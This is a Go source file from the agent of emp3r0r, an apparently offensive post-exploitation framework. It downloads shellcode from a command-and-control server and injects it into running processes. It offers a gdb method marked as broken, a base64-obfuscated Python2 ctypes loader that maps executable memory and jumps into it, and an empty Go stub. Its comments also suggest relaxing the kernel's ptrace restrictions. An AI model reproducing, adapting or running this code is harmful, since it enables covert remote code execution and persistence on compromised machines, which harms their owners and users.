package agent

import (
	"fmt"
	"io/ioutil"
	"log"
	"os/exec"
	"strconv"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/internal/tun"
)

// gdbInjectShellcode inject shellcode to a running process using GDB
// start a `sleep` process and inject to it if pid == 0
// modify /proc/sys/kernel/yama/ptrace_scope if gdb does not work
// gdb command: set (char[length])*(int*)$rip = { 0xcc }
// FIXME does not work
func gdbInjectShellcode(shellcode *string, pid, shellcodeLen int) error {
	if pid == 0 {
		cmd := exec.Command("sleep", "10")
		err := cmd.Start()
		if err != nil {
			return err
		}
		pid = cmd.Process.Pid
	}

	out, err := exec.Command(UtilsPath+"/gdb", "-q", "-ex", fmt.Sprintf("set (char[%d]*(int*)$rip={%s})", shellcodeLen, *shellcode), "-ex", "c", "-ex", "q", "-p", strconv.Itoa(pid)).CombinedOutput()
	if err != nil {
		return fmt.Errorf("GDB failed (shellcode length %d): %s\n%v", shellcodeLen, out, err)
	}

	return nil
}

// pyShellcodeLoader pure python, using ptrace
func pyShellcodeLoader(shellcode *string, shellcodeLen int) error {
	if !IsCommandExist("python2") {
		return fmt.Errorf("python2 is not found, shellcode loader won't work")
	}
	pyloader := fmt.Sprintf(`
import ctypes
import sys
from ctypes.util import find_library

PROT_READ = 0x01
PROT_WRITE = 0x02
PROT_EXEC = 0x04
MAP_PRIVATE = 0X02
MAP_ANONYMOUS = 0X20
ENOMEM = -1

SHELLCODE = "%s"

libc = ctypes.CDLL(find_library('c'))

mmap = libc.mmap
mmap.argtypes = [ctypes.c_void_p, ctypes.c_size_t,
				 ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_size_t]
mmap.restype = ctypes.c_void_p

page_size = ctypes.pythonapi.getpagesize()
sc_size = len(SHELLCODE)
mem_size = page_size * (1 + sc_size/page_size)

cptr = mmap(0, mem_size, PROT_READ | PROT_WRITE |
			PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS,
			-1, 0)

if cptr == ENOMEM:
	sys.exit("mmap")

if sc_size <= mem_size:
	ctypes.memmove(cptr, SHELLCODE, sc_size)
	sc = ctypes.CFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p)
	call_sc = ctypes.cast(cptr, sc)
	call_sc(None)
`, *shellcode)

	encPyloader := tun.Base64Encode(pyloader)
	cmd := fmt.Sprintf(`echo "exec('%s'.decode('base64'))"|python2`, encPyloader)
	out, err := exec.Command("sh", "-c", cmd).CombinedOutput()
	if err != nil {
		log.Printf("python2 shellcode loader: %v\n%s", err, out)
		return fmt.Errorf("pyloader: %v\n%s", err, out)
	}
	log.Printf("python2 loader has loaded %d of shellcode: %s", shellcodeLen, out)

	return nil
}

// goShellcodeLoader pure go, using ptrace
// TODO rewrite the python2 loader in Go
func goShellcodeLoader(shellcode *string, shellcodeLen int) error {
	return nil
}

// InjectShellcode inject shellcode to a running process using various methods
func InjectShellcode(pid int, method string) (err error) {
	// prepare the shellcode
	shellcodeFile := AgentRoot + "/shellcode.txt"
	err = DownloadViaCC(CCAddress+"shellcode.txt", shellcodeFile)
	if err != nil {
		return
	}
	sc, err := ioutil.ReadFile(shellcodeFile)
	if err != nil {
		return err
	}
	shellcode := string(sc)
	shellcodeLen := strings.Count(string(shellcode), "0x")

	// dispatch
	switch method {
	case "gdb":
		err = gdbInjectShellcode(&shellcode, pid, shellcodeLen)
	case "native":
		err = goShellcodeLoader(&shellcode, shellcodeLen)
	case "python":
		err = pyShellcodeLoader(&shellcode, shellcodeLen)
	default:
		err = fmt.Errorf("%s is not supported", method)
	}
	return
}
